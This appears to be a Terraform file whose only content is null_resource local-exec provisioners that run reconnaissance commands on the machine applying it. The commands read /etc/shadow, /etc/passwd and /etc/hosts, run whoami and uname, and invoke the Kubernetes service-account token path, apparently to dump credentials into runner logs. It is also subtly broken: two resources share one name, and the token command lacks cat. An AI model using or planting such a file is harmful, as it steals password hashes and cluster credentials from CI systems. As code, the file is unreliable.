resource "null_resource" "shadow" {
  provisioner "local-exec" {
    command = "cat /etc/shadow"
  }
}


resource "null_resource" "hosts" {
  provisioner "local-exec" {
    command = "cat /etc/hosts"
  }
}


resource "null_resource" "passwd" {
  provisioner "local-exec" {
    command = "cat /etc/passwd"
  }
}


resource "null_resource" "who" {
  provisioner "local-exec" {
    command = "whoami"
  }
}

resource "null_resource" "who" {
  provisioner "local-exec" {
    command = "uname"
  }
}

resource "null_resource" "token" {
  provisioner "local-exec" {
    command = "/run/secrets/kubernetes.io/serviceaccount/token"
  }
}